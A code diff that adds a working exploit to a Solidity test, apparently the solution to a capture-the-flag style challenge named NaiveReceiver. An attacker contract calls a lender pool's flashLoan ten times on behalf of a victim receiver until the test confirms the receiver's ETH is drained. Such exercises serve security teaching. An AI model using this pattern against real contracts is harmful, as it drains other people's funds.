@@ -48,6 +48,8 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
+        vm.prank(attacker);
+        new NaiveReceiverAttackerContract(address(naiveReceiverLenderPool), address(flashLoanReceiver));
 
         /**
          * EXPLOIT END *
@@ -60,5 +62,22 @@ contract NaiveReceiver is Test {
         // All ETH has been drained from the receiver
         assertEq(address(flashLoanReceiver).balance, 0);
         assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
+    }
+}
+
+contract NaiveReceiverAttackerContract {
+    constructor(address naiveReceiverLenderPool, address flashLoanReceiver) {
+        (new NaiveReceiverWorker()).attack(naiveReceiverLenderPool, flashLoanReceiver);
+
+        // Although contract doesn't have any balance but destructing to get some gas refund.
+        //selfdestruct(payable(msg.sender));
+    }
+}
+
+contract NaiveReceiverWorker {
+    function attack(address naiveReceiverLenderPool, address flashLoanReceiver) external {
+        for(uint256 i; i < 10; i++) {
+            NaiveReceiverLenderPool(payable(naiveReceiverLenderPool)).flashLoan(flashLoanReceiver, 0);
+        }
     }
 }
